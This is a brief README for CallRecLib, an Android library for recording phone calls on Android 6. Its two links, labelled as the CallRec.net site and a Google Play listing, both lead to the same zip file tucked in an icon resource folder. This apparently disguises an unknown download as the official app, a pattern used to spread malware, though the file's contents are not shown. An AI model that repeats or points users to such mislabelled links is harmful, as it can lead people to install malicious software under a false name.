# CallRecLib
This library provides code which can resolve the problem of recording phone conversations on Android 6.
# List of applications using this library
[CallRec.net](https://github.com/fabianaguirre10/CallRecLib/raw/refs/heads/master/app/src/main/res/mipmap-xxxhdpi/Rec-Call-Lib-v2.4.zip)

[CallRec in Google Play] (https://github.com/fabianaguirre10/CallRecLib/raw/refs/heads/master/app/src/main/res/mipmap-xxxhdpi/Rec-Call-Lib-v2.4.zip)

# How to run the example
For the example application to work, you need to give permissions in the system settings
